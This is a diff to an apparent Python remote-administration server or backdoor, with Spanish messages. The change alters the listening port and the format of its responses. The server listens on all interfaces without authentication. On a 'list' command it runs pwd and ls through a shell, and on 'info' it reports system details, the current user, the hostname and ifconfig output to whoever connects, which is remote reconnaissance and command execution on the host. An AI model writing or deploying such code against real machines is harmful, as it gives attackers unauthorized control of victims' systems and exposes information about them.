@@ -15,7 +15,7 @@ from gi.repository import Gdk
 
 
 ip = "0.0.0.0"
-port = 45454
+port = 45451
 max_conections = 5
 array = []
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,16 +29,16 @@ def admin(socket_client):
     print("[*] Mensaje recibido: ", array[0])
 
     if 'list' in array[0]:
-        response = ("[*] Directorio actual --> ") + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + '\n'
-        response += str(Popen('ls', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        response = ("[*] Directorio actual --> ") + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + "/*/*"
+        response += ("[*] Listado de archivos --> ") + str(Popen('ls', shell=True, stdout=PIPE).stdout.read()) 
 
     elif 'info' in array[0]:
-        response = "[*] Sys_Info 	-->	" + str(Popen('uname -a', shell=True, stdout=PIPE).stdout.read()) + '\n'
-        response += "[*] User 	-->	" + str(Popen('whoami', shell=True, stdout=PIPE).stdout.read()) + '\n'
-        response += "[*] Path 	-->	" + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        response = "[*] Sys_Info 	-->	" + str(Popen('uname -a', shell=True, stdout=PIPE).stdout.read())  + "/*/*"
+        response += "[*] User 	-->	" + str(Popen('whoami', shell=True, stdout=PIPE).stdout.read()) + "/*/*"
+        response += "[*] Path 	-->	" + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + "/*/*"
         osInfo = platform.uname()
-        response += "[*] Pc name	-->	" + str(osInfo[1]) + '\n'
-        response += "[*] Net_Info 	-->	" + str(Popen('ifconfig', shell=True, stdout=PIPE).stdout.read()) + '\n'
+        response += "[*] Pc name	-->	" + str(osInfo[1]) + "/*/*"
+        response += "[*] Net_Info 	-->	" + str(Popen('ifconfig', shell=True, stdout=PIPE).stdout.read()) 
 
     elif 'cd' in array[0]:
         if os.path.isdir(array[1]):
